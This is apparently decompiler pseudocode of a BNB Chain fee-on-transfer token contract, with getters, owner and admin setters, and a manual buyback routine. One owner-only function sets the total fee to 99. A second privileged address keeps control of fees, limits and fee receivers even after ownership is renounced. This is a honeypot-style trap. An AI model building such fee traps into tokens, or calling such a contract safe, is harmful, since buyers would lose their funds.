contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transferLiquidity(address arg1, uint256 arg2)
#  - transfer(address arg1, uint256 arg2)
#
const decimals = 9


address owner;
array of struct stor1;
array of struct stor2;
uint256 totalSupply;
uint256 sub_b4a65a5f;
uint256 _maxWalletSize;
address stor6;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor9;
mapping of uint8 stor10;
uint256 stor11;
uint256 stor13;
uint256 stor15;
uint256 totalFee;
uint256 stor17; offset 2
uint256 stor17;
address stor18;
address stor19;
address stor20;
uint256 stor21;
uint256 stor22;
address routerAddress;
uint8 swapEnabled; offset 160
uint128 stor24; offset 160
address pairAddress;
uint256 swapThreshold;
uint8 stor26;

function swapThreshold() {
    return swapThreshold
}

function totalSupply() {
    return totalSupply
}

function swapEnabled() {
    return bool(swapEnabled)
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function getOwner() {
    return owner
}

function owner() {
    return owner
}

function _maxWalletSize() {
    return _maxWalletSize
}

function pair() {
    return pairAddress
}

function sub_b4a65a5f(?) {
    return sub_b4a65a5f
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function getTotalFee(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return totalFee
}

function router() {
    return routerAddress
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approveMax(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    allowance[address(msg.sender)][address(arg1)] = -1
    emit Approval(-1, msg.sender, arg1);
    return 1
}

function sub_3d5fe27f(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor11 = 0
    stor13 = 0
    stor15 = 99
    totalFee = 99
    uint256(stor17.field_0) = 100
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setIsTxLimitExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if stor6 != msg.sender:
        revert with 0, 'Unauthorized'
    stor10[address(arg1)] = uint8(arg2)
}

function setIsFeeExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor9[address(arg1)] = uint8(arg2)
}

function setTargetLiquidity(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor21 = arg1
    stor22 = arg2
}

function setFeeReceivers(address arg1, address arg2, address arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if stor6 != msg.sender:
        revert with 0, 'Unauthorized'
    stor18 = arg1
    stor19 = arg2
    stor20 = arg3
}

function setSwapBackSettings(bool arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(96, 0, stor24.field_160) = Mask(96, 0, arg1)
    swapThreshold = arg2
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function getCirculatingSupply() {
    if balanceOf[57005] > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if totalSupply < balanceOf[57005]:
        revert with 'NH{q', 17
    if balanceOf[0] > totalSupply - balanceOf[57005]:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if totalSupply - balanceOf[57005] < balanceOf[0]:
        revert with 'NH{q', 17
    return (totalSupply - balanceOf[57005] - balanceOf[0])
}

function setMaxWallet(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor6 != msg.sender:
        revert with 0, 'Unauthorized'
    if not totalSupply:
        _maxWalletSize = 0
    else:
        if totalSupply and arg1 > -1 / totalSupply:
            revert with 'NH{q', 17
        if not totalSupply:
            revert with 'NH{q', 18
        if totalSupply * arg1 / totalSupply != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        _maxWalletSize = totalSupply * arg1 / 100
}

function sub_77105a5f(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor6 != msg.sender:
        revert with 0, 'Unauthorized'
    if arg1 < 1:
        revert with 0, 'Txn Cap must be greater than 1%'
    if not totalSupply:
        sub_b4a65a5f = 0
    else:
        if totalSupply and arg1 > -1 / totalSupply:
            revert with 'NH{q', 17
        if not totalSupply:
            revert with 'NH{q', 18
        if totalSupply * arg1 / totalSupply != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        sub_b4a65a5f = totalSupply * arg1 / 100
}

function sub_17e1df5b(?) {
    require calldata.size - 4 >= 128
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg4 == arg4
    if stor6 != msg.sender:
        revert with 0, 'Unauthorized'
    stor11 = arg1
    stor13 = arg2
    stor15 = arg3
    if arg1 > -arg2 - 1:
        revert with 'NH{q', 17
    if arg1 + arg2 < arg1:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg2 > -arg3 - 1:
        revert with 'NH{q', 17
    if arg3 < 0:
        revert with 0, 'SafeMath: addition overflow'
    totalFee = arg1 + arg2 + arg3
    uint256(stor17.field_0) = arg4
    require totalFee < Mask(254, 0, stor17.field_2)
}

function triggerManualBuyback(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor6 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Unauthorized to trigger manual buyback'
    stor26 = 1
    mem[128] = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    mem[160] = this.address
    mem[192] = 0xb6f9de9500000000000000000000000000000000000000000000000000000000
    mem[196] = 0
    idx = 0
    s = 128
    t = 356
    while idx < 2:
        mem[t] = mem[s + 12 len 20]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    require ext_code.size(routerAddress)
    call routerAddress.swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 arg1, address[] arg2, address arg3, uint256 arg4) with:
       value arg1 wei
         gas gas_remaining wei
        args 0, 128, stor20, block.timestamp, 2, mem[356 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    stor26 = 0
}

function setName(string arg1) {
    require calldata.size - 4 >= 32
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 'NH{q', 65
    if ceil32(ceil32(arg1.length)) + 97 > test266151307() or ceil32(ceil32(arg1.length)) + 97 < 96:
        revert with 'NH{q', 65
    require arg1 + arg1.length + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor1[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor1.length = 0
            idx = 0
            while stor1.length.field_1 + 31 / 32 > idx:
                stor1[idx].field_0 = 0
                idx = idx + 1
                continue 
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor1[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor1.length = 0
            idx = 0
            while stor1.length.field_1 + 31 / 32 > idx:
                stor1[idx].field_0 = 0
                idx = idx + 1
                continue 
}

function setSymbol(string arg1) {
    require calldata.size - 4 >= 32
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 'NH{q', 65
    if ceil32(ceil32(arg1.length)) + 97 > test266151307() or ceil32(ceil32(arg1.length)) + 97 < 96:
        revert with 'NH{q', 65
    require arg1 + arg1.length + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor2[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor2.length = 0
            idx = 0
            while stor2.length.field_1 + 31 / 32 > idx:
                stor2[idx].field_0 = 0
                idx = idx + 1
                continue 
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor2[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor2.length = 0
            idx = 0
            while stor2.length.field_1 + 31 / 32 > idx:
                stor2[idx].field_0 = 0
                idx = idx + 1
                continue 
}

function getLiquidityBacking(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if balanceOf[57005] > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if totalSupply < balanceOf[57005]:
        revert with 'NH{q', 17
    if balanceOf[0] > totalSupply - balanceOf[57005]:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if totalSupply - balanceOf[57005] < balanceOf[0]:
        revert with 'NH{q', 17
    if not balanceOf[address(stor24.field_0)]:
        if arg1:
            if arg1 and 0 > -1 / arg1:
                revert with 'NH{q', 17
            if not arg1:
                revert with 'NH{q', 18
            if 0 / arg1:
                revert with 0, 'SafeMath: multiplication overflow'
        if totalSupply - balanceOf[57005] - balanceOf[0] <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not totalSupply - balanceOf[57005] - balanceOf[0]:
            revert with 'NH{q', 18
        return (0 / totalSupply - balanceOf[57005] - balanceOf[0])
    if balanceOf[address(stor24.field_0)] and 2 > -1 / balanceOf[address(stor24.field_0)]:
        revert with 'NH{q', 17
    if not balanceOf[address(stor24.field_0)]:
        revert with 'NH{q', 18
    if 2 * balanceOf[address(stor24.field_0)] / balanceOf[address(stor24.field_0)] != 2:
        revert with 0, 'SafeMath: multiplication overflow'
    if not arg1:
        if totalSupply - balanceOf[57005] - balanceOf[0] <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not totalSupply - balanceOf[57005] - balanceOf[0]:
            revert with 'NH{q', 18
        return (0 / totalSupply - balanceOf[57005] - balanceOf[0])
    if arg1 and 2 * balanceOf[address(stor24.field_0)] > -1 / arg1:
        revert with 'NH{q', 17
    if not arg1:
        revert with 'NH{q', 18
    if arg1 * 2 * balanceOf[address(stor24.field_0)] / arg1 != 2 * balanceOf[address(stor24.field_0)]:
        revert with 0, 'SafeMath: multiplication overflow'
    if totalSupply - balanceOf[57005] - balanceOf[0] <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply - balanceOf[57005] - balanceOf[0]:
        revert with 'NH{q', 18
    return (arg1 * 2 * balanceOf[address(stor24.field_0)] / totalSupply - balanceOf[57005] - balanceOf[0])
}

function isOverLiquified(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if balanceOf[57005] > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if totalSupply < balanceOf[57005]:
        revert with 'NH{q', 17
    if balanceOf[0] > totalSupply - balanceOf[57005]:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if totalSupply - balanceOf[57005] < balanceOf[0]:
        revert with 'NH{q', 17
    if not balanceOf[address(stor24.field_0)]:
        if arg2:
            if arg2 and 0 > -1 / arg2:
                revert with 'NH{q', 17
            if not arg2:
                revert with 'NH{q', 18
            if 0 / arg2:
                revert with 0, 'SafeMath: multiplication overflow'
        if totalSupply - balanceOf[57005] - balanceOf[0] <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not totalSupply - balanceOf[57005] - balanceOf[0]:
            revert with 'NH{q', 18
        return (0 / totalSupply - balanceOf[57005] - balanceOf[0] > arg1)
    if balanceOf[address(stor24.field_0)] and 2 > -1 / balanceOf[address(stor24.field_0)]:
        revert with 'NH{q', 17
    if not balanceOf[address(stor24.field_0)]:
        revert with 'NH{q', 18
    if 2 * balanceOf[address(stor24.field_0)] / balanceOf[address(stor24.field_0)] != 2:
        revert with 0, 'SafeMath: multiplication overflow'
    if not arg2:
        if totalSupply - balanceOf[57005] - balanceOf[0] <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not totalSupply - balanceOf[57005] - balanceOf[0]:
            revert with 'NH{q', 18
        return (0 / totalSupply - balanceOf[57005] - balanceOf[0] > arg1)
    if arg2 and 2 * balanceOf[address(stor24.field_0)] > -1 / arg2:
        revert with 'NH{q', 17
    if not arg2:
        revert with 'NH{q', 18
    if arg2 * 2 * balanceOf[address(stor24.field_0)] / arg2 != 2 * balanceOf[address(stor24.field_0)]:
        revert with 0, 'SafeMath: multiplication overflow'
    if totalSupply - balanceOf[57005] - balanceOf[0] <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply - balanceOf[57005] - balanceOf[0]:
        revert with 'NH{q', 18
    return (arg2 * 2 * balanceOf[address(stor24.field_0)] / totalSupply - balanceOf[57005] - balanceOf[0] > arg1)
}

function name() {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function symbol() {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}



}
